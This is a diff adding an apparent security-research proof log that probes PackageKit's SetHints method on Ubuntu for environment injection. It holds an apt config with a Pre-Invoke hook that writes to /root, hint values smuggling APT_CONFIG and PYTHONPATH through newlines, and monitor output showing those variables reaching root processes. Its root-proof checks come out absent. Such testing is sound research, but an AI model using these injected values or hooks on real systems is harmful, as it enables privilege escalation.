@@ -1,0 +1,500 @@
+## target/default proof
+PRETTY_NAME="Ubuntu 24.04.4 LTS"
+NAME="Ubuntu"
+VERSION_ID="24.04"
+VERSION="24.04.4 LTS (Noble Numbat)"
+VERSION_CODENAME=noble
+ID=ubuntu
+ID_LIKE=debian
+HOME_URL="https://www.ubuntu.com/"
+Linux 508d797cbad0 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
+uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
+uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
+apt	2.8.3	ii 
+dbus	1.14.10-4ubuntu4.1	ii 
+gir1.2-packagekitglib-1.0	1.2.8-2ubuntu1.5	ii 
+libpackagekit-glib2-18:arm64	1.2.8-2ubuntu1.5	ii 
+packagekit	1.2.8-2ubuntu1.5	ii 
+packagekit-tools	1.2.8-2ubuntu1.5	ii 
+polkitd	124-2ubuntu1.24.04.3	ii 
+python3-gi	3.48.2-1	ii 
+systemd	255.4-1ubuntu8.15	ii 
+
+## PackageKit service and SetHints docs
+# /usr/lib/systemd/system/packagekit.service
+[Unit]
+Description=PackageKit Daemon
+# PK doesn't know how to do anything on ostree-managed systems;
+# currently the design is to have dedicated daemons like
+# eos-updater and rpm-ostree, and gnome-software talks to those.
+ConditionPathExists=!/run/ostree-booted
+Wants=network-online.target
+
+[Service]
+Type=dbus
+BusName=org.freedesktop.PackageKit
+User=root
+ExecStart=/usr/libexec/packagekitd
+    <method name="SetHints">
+      <annotation name="org.freedesktop.DBus.GLib.Async" value=""/>
+      <doc:doc>
+        <doc:description>
+          <doc:para>
+            This method allows the calling session to set transaction hints for
+            the package manager which can change as the transaction runs.
+          </doc:para>
+          <doc:para>
+            This method can be sent before the transaction has been run or
+            whilst it is running. There is no limit to the number of times this
+            method can be sent, although some backends may only use the values
+            that were set before the transaction was started.
+          </doc:para>
+          <doc:para>
+            Each parameter value is optional.
+          </doc:para>
+        </doc:description>
+      </doc:doc>
+      <arg type="as" name="hints" direction="in">
+        <doc:doc>
+          <doc:summary>
+            <doc:para>
+              The values as an array of strings, for example
+              <doc:tt>['locale=en_GB.utf8','idle=true','interactive=false','cache-age=3600']</doc:tt>.
+            </doc:para>
+            <doc:para>
+              The following parameter values are understood:
+            </doc:para>
+            <doc:list>
+              <doc:item>
+                <doc:term>locale</doc:term>
+                <doc:definition>
+                  The locale code, for example <doc:tt>en_GB</doc:tt>.
+                </doc:definition>
+              </doc:item>
+              <doc:item>
+                <doc:term>background</doc:term>
+                <doc:definition>
+                  If the method should be executed as a background task, valid
+                  values are <doc:tt>true</doc:tt> and <doc:tt>false</doc:tt>,
+                  and other values will result in an error.
+                  Background tasks are normally treated with a low priority than
+                  regular tasks, and normally only use idle CPU and network.
+                </doc:definition>
+              </doc:item>
+              <doc:item>
+                <doc:term>interactive</doc:term>
+                <doc:definition>
+                  If the method can ask interactive questions whilst running,
+                  valid values are <doc:tt>true</doc:tt> and <doc:tt>false</doc:tt>,
+                  and other values will result in an error.
+                </doc:definition>
+              </doc:item>
+              <doc:item>
+                <doc:term>cache-age</doc:term>
+                <doc:definition>
+                  This allows the frontend to set how fresh it needs the
+                  metadata used in the transaction.
+                  This allows fine control of the age of the returned results,
+                  but means the frontend probably has to query the updates
+                  check value and pass it this value for <doc:tt>GetUpdates</doc:tt>,
+                  and choose something sane otherwise.
+                  Most interactive clients will set this to <doc:tt>intmax</doc:tt>
+                  which means "never download new metadata, unless required to return results".
+                  Most transactions will not have this value set.
+                </doc:definition>
+              </doc:item>
+              <doc:item>
+                <doc:term>supports-plural-signals</doc:term>
+                <doc:definition>
+                  This allows the frontend to tell the daemon that it supports the
+                  new <doc:tt>Packages</doc:tt> signal for receiving information about
+                  multiple packages at once, rather than just the original
+                  <doc:tt>Package</doc:tt> signal.
+                  If this is set, and the daemon supports the signal, it will be used.
+                  If present, this must always be set to <doc:tt>true</doc:tt>.
+                </doc:definition>
+              </doc:item>
+            </doc:list>
+            <doc:para>
+              Other values will cause a verbose warning in the daemon, but will
+              not cause the method to fail. This will preserve forward and
+              backwards compatibility for future API versions.
+            </doc:para>
+          </doc:summary>
+        </doc:doc>
+      </arg>
+    </method>
+  <action id="org.freedesktop.packagekit.system-sources-refresh">
+    <!-- SECURITY:
+          - Normal users do not require admin authentication to refresh the
+            cache, as this doesn't actually install or remove software.
+     -->
+    <description>Refresh system repositories</description>
+    <description xml:lang="zh_TW">重整系統軟體庫</description>
+    <description xml:lang="zh_CN">刷新系统仓库</description>
+    <description xml:lang="uk">Оновлення списків сховищ системи</description>
+    <description xml:lang="tr">Sistem depolarını yenile</description>
+    <description xml:lang="sv">Uppdatera systemprogramförråden</description>
+    <description xml:lang="sr">Освежи системске ризнице</description>
+    <description xml:lang="sq">Rifresko depo sistemi</description>
+    <description xml:lang="sl">Osveži sistemska skladišča</description>
+    <description xml:lang="sk">Obnoviť systémové repozitáre</description>
+    <description xml:lang="si">පද්ධති ගබඩාවන් නැවුම් කරන්න</description>
+    <description xml:lang="ru">Обновить системные репозитории</description>
+    <description xml:lang="ro">Împrospătează depozitele sistemului</description>
+    <description xml:lang="pt">Atualizar fontes do sistema</description>
+    <description xml:lang="pt_BR">Atualizar repositórios de sistema</description>
+    <description xml:lang="pl">Odświeżenie repozytoriów systemu</description>
+    <description xml:lang="pa">ਸਿਸਟਮ ਰਿਪੋਜ਼ਟਰੀਆਂ ਤਾਜ਼ਾ ਕਰੋ</description>
+    <description xml:lang="ko">시스템 저장소 새로 고침</description>
+    <description xml:lang="ka">სისტემური რეპოზიტორიების განახლება</description>
+    <description xml:lang="ja">システムリポジトリの更新</description>
+    <description xml:lang="it">Aggiorna repository di sistema</description>
+    <description xml:lang="id">Segarkan repositori sistem</description>
+    <description xml:lang="hu">Rendszertárolók frissítése</description>
+    <description xml:lang="hr">Osvježi repozitorije sustava</description>
+    <description xml:lang="he">רענון מאגרי המערכת</description>
+    <description xml:lang="fr">Actualiser les dépôts du système</description>
+    <description xml:lang="fi">Päivitä järjestelmän ohjelmistolähteet</description>
+    <description xml:lang="eu">Freskatu sistemaren biltegiak</description>
+    <description xml:lang="es">Recargar repositorios del sistema</description>
+    <description xml:lang="eo">Aktualigi sistem-deponejojn</description>
+    <description xml:lang="en_GB">Refresh system repositories</description>
+    <description xml:lang="de">System-Repositorien aktualisieren</description>
+    <description xml:lang="da">Opdater systempakkearkiver</description>
+    <description xml:lang="cs">Aktualizovat systémové repozitáře</description>
+    <description xml:lang="ca">Refresca els dipòsits del sistema</description>
+    <message>Authentication is required to refresh the system repositories</message>
+    <message xml:lang="zh_TW">必須先通過身份核對才能重新整理系統軟體庫</message>
+    <message xml:lang="zh_CN">刷新系统仓库需要认证</message>
+    <message xml:lang="uk">Для оновлення списку сховищ системи слід пройти розпізнавання</message>
+    <message xml:lang="tr">Sistem depolarını yenilemek için kimlik doğrulaması gerekiyor</message>
+    <message xml:lang="sv">Autentisering krävs för att uppdatera systemprogramförråden</message>
+    <message xml:lang="sr">Потребно је потврђивање идентитета за освежавање системских ризница</message>
+    <message xml:lang="sq">Që të rifreskohen depot e sistemit, lypset mirëfilltësim</message>
+    <message xml:lang="sl">Za osvežitev sistemskih skladišč je zahtevana overitev</message>
+    <message xml:lang="sk">Vyžaduje sa overenie totožnosti na obnovenie systémových repozitárov</message>
+    <message xml:lang="si">පද්ධති ගබඩාවන් නැවුම් කිරීමට සත්‍යාපනය අවශ්‍ය වේ</message>
+    <message xml:lang="ru">Для обновления системных репозиториев необходима аутентификация</message>
+    <message xml:lang="ro">Este necesară autentificarea pentru a împrospăta depozitele sistemului</message>
+    <message xml:lang="pt">Autenticação é necessária para atualizar as fontes do sistema</message>
+    <message xml:lang="pt_BR">Autenticação é necessária para atualizar os repositórios de sistema</message>
+    <message xml:lang="pl">Wymagane jest uwierzytelnienie, aby odświeżyć repozytoria systemu</message>
+    <message xml:lang="pa">ਸਿਸਟਮ ਰਿਪੋਜ਼ਟਰੀਆਂ ਤਾਜ਼ਾ ਕਰਨ ਲਈ ਪਰਮਾਣਕਿਤਾ ਚਾਹੀਦੀ ਹੈ</message>
+    <message xml:lang="ko">시스템 저장소를 새로 고치려면 인증해야 합니다</message>
+    <message xml:lang="ja">システムリポジトリの更新には認証が必要です</message>
+    <message xml:lang="it">È richiesto autenticarsi per aggiornare i repository di sistema</message>
+    <message xml:lang="id">Otentikasi diperlukan untuk menyegarkan repositori sistem</message>
+    <message xml:lang="hu">Hitelesítés szükséges a rendszertárolók frissítéséhez</message>
+    <message xml:lang="hr">Potrebna je ovjera za osvježavanje repozitorija sustava</message>
+    <message xml:lang="he">נדרש אימות כדי לרענן את מאגרי המערכת</message>
+    <message xml:lang="fr">Une authentification est nécessaire pour rafraîchir les dépôts du système </message>
+    <message xml:lang="fi">Ohjelmistolähteiden päivittäminen vaatii tunnistautumisen</message>
+    <message xml:lang="eu">Autentifikazioa behar da sistemaren biltegiak freskatzeko</message>
+    <message xml:lang="es">Necesita autenticarse para actualizar los repositorios del sistema</message>
+    <message xml:lang="eo">Necesas aŭtentigo por aktualigi la sistem-deponejojn</message>
+    <message xml:lang="en_GB">Authentication is required to refresh the system repositories</message>
+    <message xml:lang="de">Legitimation ist zum Aktualisieren der System-Repositorien erforderlich</message>
+    <message xml:lang="da">Godkendelse kræves for at opdatere systempakkearkiverne</message>
+    <message xml:lang="cs">Pro aktualizaci systémových repozitářů je vyžadováno ověření</message>
+    <message xml:lang="ca">Es requereix autenticació per refrescar els dipòsits de sistema</message>
+    <message xml:lang="ar">الاستيثاق مطلوب لتحديث مستودعات النظام</message>
+    <icon_name>package-x-generic</icon_name>
+    <defaults>
+      <allow_any>auth_admin</allow_any>
+      <allow_inactive>yes</allow_inactive>
+      <allow_active>yes</allow_active>
+    </defaults>
+  </action>
+
+## evil apt config
+-rw-r--r-- 1 root root 72 May 16 20:20 /tmp/packagekit-sethints-env/evil-apt.conf
+APT::Update::Pre-Invoke { "id > /root/packagekit_sethints_env_root"; };
+
+## active selfauth trigger
+uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
+/dev/tty9
+XDG_SESSION_ID=28
+Id=26
+User=1002
+Name=selfauth
+Seat=seat0
+TTY=tty1
+Remote=no
+Type=tty
+Class=user
+Active=no
+State=online
+uid 1002 gid 1002
+XDG_SESSION_ID 26
+== scenario locale-newline ==
+tx=/37_badaedab
+SetHints ok ['locale=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1', 'interactive=true', 'background=false', 'cache-age=1']
+RRefreshCache method-returnssignal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-updates InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-updates InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-security InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-security InRelease', True)
+signal Finished (1, 2479)
+== scenario cache-age-newline ==
+tx=/39_acdedbdc
+SetHints ok ['locale=C.UTF-8', 'cache-age=1\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_CACHE_SPLIT=1', 'interactive=true', 'background=false']
+RefreshCache method-returnssignal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-updates InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-updates InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-security InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-security InRelease', True)
+signal Finished (1, 2166)
+== scenario locale-pythonpath-newline ==
+tx=/41_cecacecc
+SetHints ok ['locale=C.UTF-8\nPYTHONPATH=/tmp/packagekit-sethints-env/py\nPK_HINT_PYTHONPATH_SPLIT=1', 'interactive=true', 'background=false', 'cache-age=1']
+RefreshCache method-returnssignal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-updates InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-updates InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-security InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-security InRelease', True)
+signal Finished (1, 2592)
+== scenario unknown-newline ==
+tx=/43_cbbbaaed
+SetHints ok ['locale=C.UTF-8', 'pk-hint-probe=x\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_UNKNOWN_SPLIT=1', 'interactive=true', 'background=false', 'cache-age=1']
+RefreshCache method-returnssignal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-updates InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-updates InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-security InRelease', True)
+signal RepoDetail ('', 'http://ports.ubuntu.com/ubuntu-ports noble-security InRelease', True)
+signal Finished (1, 2708)
+
+## root environment monitor hits
+### PID=191073 CMD=/usr/libexec/packagekitd 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=193036 CMD=/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=193087 CMD=/usr/lib/apt/methods/http 
+LANG=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+LANGUAGE=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+ENV_ENTRY_REPR=b'LANG=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+### PID=193168 CMD=/usr/lib/apt/methods/https 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=193664 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+LANGUAGE=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+ENV_ENTRY_REPR=b'LANG=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+### PID=193888 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=194300 CMD=/usr/libexec/packagekitd 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+LANG=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+LANGUAGE=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+ENV_ENTRY_REPR=b'LANG=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+LANGUAGE=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+LANG=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+ENV_ENTRY_REPR=b'LANG=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+### PID=195502 CMD=/usr/bin/python3 /usr/lib/update-notifier/apt-check --human-readable  
+LANGUAGE=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+LANG=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+ENV_ENTRY_REPR=b'LANG=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+### PID=201477 CMD=/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=201497 CMD=/usr/lib/apt/methods/http 
+LANG=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+LANGUAGE=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+ENV_ENTRY_REPR=b'LANG=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+### PID=201609 CMD=/usr/lib/apt/methods/https 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=201710 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+LANGUAGE=C.UTF-8
+APT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf
+ENV_ENTRY_REPR=b'LANG=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8\nAPT_CONFIG=/tmp/packagekit-sethints-env/evil-apt.conf\nPK_HINT_SPLIT=1'
+### PID=202009 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=202301 CMD=/usr/libexec/packagekitd 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=203859 CMD=/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=203896 CMD=/usr/lib/apt/methods/http 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8'
+### PID=203977 CMD=/usr/lib/apt/methods/https 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=204306 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8'
+### PID=204618 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=205049 CMD=/usr/libexec/packagekitd 
+LANG=C.UTF-8
+### PID=206601 CMD=/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=206606 CMD=/usr/lib/apt/methods/http 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8'
+### PID=206695 CMD=/usr/lib/apt/methods/https 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=206807 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8'
+### PID=207156 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=207305 CMD=/usr/libexec/packagekitd 
+LANG=C.UTF-8
+### PID=209077 CMD=/usr/libexec/packagekitd 
+LANG=C.UTF-8
+### PID=209081 CMD=/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py 
+LANG=C.UTF-8
+### PID=209135 CMD=/usr/lib/apt/methods/http 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8\nPYTHONPATH=/tmp/packagekit-sethints-env/py\nPK_HINT_PYTHONPATH_SPLIT=1'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8\nPYTHONPATH=/tmp/packagekit-sethints-env/py\nPK_HINT_PYTHONPATH_SPLIT=1'
+### PID=209151 CMD=/usr/lib/apt/methods/https 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=209233 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8\nPYTHONPATH=/tmp/packagekit-sethints-env/py\nPK_HINT_PYTHONPATH_SPLIT=1'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8\nPYTHONPATH=/tmp/packagekit-sethints-env/py\nPK_HINT_PYTHONPATH_SPLIT=1'
+### PID=209567 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=210059 CMD=/usr/libexec/packagekitd 
+### PID=211728 CMD=/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=211738 CMD=/usr/lib/apt/methods/http 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8\nPYTHONPATH=/tmp/packagekit-sethints-env/py\nPK_HINT_PYTHONPATH_SPLIT=1'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8\nPYTHONPATH=/tmp/packagekit-sethints-env/py\nPK_HINT_PYTHONPATH_SPLIT=1'
+### PID=211849 CMD=/usr/lib/apt/methods/https 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=211961 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8\nPYTHONPATH=/tmp/packagekit-sethints-env/py\nPK_HINT_PYTHONPATH_SPLIT=1'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8\nPYTHONPATH=/tmp/packagekit-sethints-env/py\nPK_HINT_PYTHONPATH_SPLIT=1'
+### PID=212258 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=212548 CMD=/usr/libexec/packagekitd 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=214395 CMD=/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=214420 CMD=/usr/lib/apt/methods/http 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8'
+### PID=214531 CMD=/usr/lib/apt/methods/https 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=214700 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8'
+### PID=214813 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+### PID=214929 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=215357 CMD=/usr/libexec/packagekitd 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=217017 CMD=/usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=217048 CMD=/usr/lib/apt/methods/http 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8'
+### PID=217123 CMD=/usr/lib/apt/methods/https 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=217187 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+### PID=217193 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+ENV_ENTRY_REPR=b'LANGUAGE=C.UTF-8'
+### PID=217364 CMD=/usr/lib/apt/methods/gpgv 
+LANG=C.UTF-8
+LANGUAGE=C.UTF-8
+### PID=217638 CMD=/usr/libexec/packagekitd 
+LANG=C.UTF-8
+ENV_ENTRY_REPR=b'LANG=C.UTF-8'
+
+## root proof checks
+ROOT_PROOF_ABSENT /root/packagekit_sethints_env_root
+PYTHONPATH_ROOT_PROOF_ABSENT /root/packagekit_sethints_env_pythonpath_root
+
+## cleanup health before cleanup
+running
+
+## cleanup verification
+root_marker_absent
+py_marker_absent
+running
